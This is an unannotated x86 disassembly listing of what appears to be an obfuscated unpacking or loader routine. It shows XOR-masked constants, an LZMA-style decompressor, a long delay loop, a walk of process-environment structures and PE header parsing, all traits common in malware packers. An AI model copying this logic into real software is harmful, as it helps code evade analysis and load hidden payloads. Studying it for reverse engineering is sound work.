  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
  41d745:	push   DWORD PTR [ebp+0x8]
  41d748:	lea    ecx,[ebp-0xc0]
  41d74e:	mov    DWORD PTR [eax+0x1a8],ecx
  41d754:	call   0x41facd
  41d759:	mov    ecx,DWORD PTR [ebp-0x14]
  41d75c:	xor    ecx,ebx
  41d75e:	add    ecx,esi
  41d760:	cmp    ecx,eax
  41d762:	je     0x41da3f
  41d768:	mov    eax,DWORD PTR [ebp+0x8]
  41d76b:	mov    eax,DWORD PTR [eax+0x194]
  41d771:	mov    ecx,DWORD PTR [eax]
  41d773:	mov    eax,DWORD PTR [ebp+0x8]
  41d776:	mov    eax,DWORD PTR [eax+0x194]
  41d77c:	mov    eax,DWORD PTR [eax]
  41d77e:	add    eax,DWORD PTR [ecx+0x3c]
  41d781:	mov    ecx,DWORD PTR [ebp+0x8]
  41d784:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41d78a:	lea    edx,[ebp-0xc4]
  41d790:	push   edx
  41d791:	mov    edx,DWORD PTR [ebp+0x8]
  41d794:	mov    edx,DWORD PTR [edx+0x18c]
  41d79a:	mov    edx,DWORD PTR [edx]
  41d79c:	add    edx,DWORD PTR [eax+0x88]
  41d7a2:	push   0x4
  41d7a4:	push   DWORD PTR [eax+0x8c]
  41d7aa:	push   edx
  41d7ab:	call   DWORD PTR [ecx+0x1c]
  41d7ae:	push   DWORD PTR [ebp+0x8]
  41d7b1:	mov    edi,DWORD PTR [ebp+0x8]
  41d7b4:	mov    eax,DWORD PTR [ebp+0x8]
  41d7b7:	mov    edx,DWORD PTR [eax+0x1b8]
  41d7bd:	mov    DWORD PTR [ebp-0x68],0xe080f00
  41d7c4:	mov    DWORD PTR [ebp-0x64],0x50c011f
  41d7cb:	mov    WORD PTR [ebp-0x60],0x7c3d
  41d7d1:	mov    DWORD PTR [ebp-0x90],0x43f0f25
  41d7db:	mov    DWORD PTR [ebp-0x8c],0x3d0e1d
  41d7e5:	mov    DWORD PTR [ebp-0x88],0x221d040c
  41d7ef:	mov    DWORD PTR [ebp-0x84],0xe190109
  41d7f9:	mov    DWORD PTR [ebp-0x80],0x7c3d1f05
  41d800:	mov    DWORD PTR [ebp-0x7c],0x43f0f25
  41d807:	mov    DWORD PTR [ebp-0x78],0x3d0e1d
  41d80e:	mov    DWORD PTR [ebp-0x74],0x221d040c
  41d815:	mov    DWORD PTR [ebp-0x70],0xe190109
  41d81c:	mov    DWORD PTR [ebp-0x6c],0x7c2b1f05
  41d823:	call   0x41fafc
  41d828:	push   eax
  41d829:	mov    eax,DWORD PTR [ebp+0x8]
  41d82c:	mov    eax,DWORD PTR [eax+0x1a8]
  41d832:	push   DWORD PTR [eax]
  41d834:	call   0x41f79d
  41d839:	test   eax,eax
  41d83b:	jne    0x41d88d
  41d83d:	mov    eax,DWORD PTR [ebp+0x8]
  41d840:	mov    eax,DWORD PTR [eax+0x1d8]
  41d846:	mov    edi,DWORD PTR [ebp+0x8]
  41d849:	add    eax,0x4
  41d84c:	mov    DWORD PTR [ebp-0x24],eax
  41d84f:	mov    eax,DWORD PTR [ebp+0x8]
  41d852:	mov    edx,DWORD PTR [eax+0x1b8]
  41d858:	call   0x41fafc
  41d85d:	push   eax
  41d85e:	mov    eax,DWORD PTR [ebp-0x24]
  41d861:	call   DWORD PTR [eax]
  41d863:	test   eax,eax
  41d865:	jne    0x41d88d
  41d867:	mov    eax,DWORD PTR [ebp+0x8]
  41d86a:	mov    eax,DWORD PTR [eax+0x1d8]
  41d870:	mov    edi,DWORD PTR [ebp+0x8]
  41d873:	add    eax,0x10
  41d876:	mov    DWORD PTR [ebp-0x24],eax
  41d879:	mov    eax,DWORD PTR [ebp+0x8]
  41d87c:	mov    edx,DWORD PTR [eax+0x1b8]
  41d882:	call   0x41fafc
  41d887:	push   eax
  41d888:	mov    eax,DWORD PTR [ebp-0x24]
  41d88b:	call   DWORD PTR [eax]
  41d88d:	mov    eax,DWORD PTR [ebp-0x14]
  41d890:	mov    ecx,DWORD PTR [ebp-0x28]
  41d893:	xor    eax,ebx
  41d895:	add    eax,esi
  41d897:	cmp    eax,ecx
  41d899:	je     0x41da18
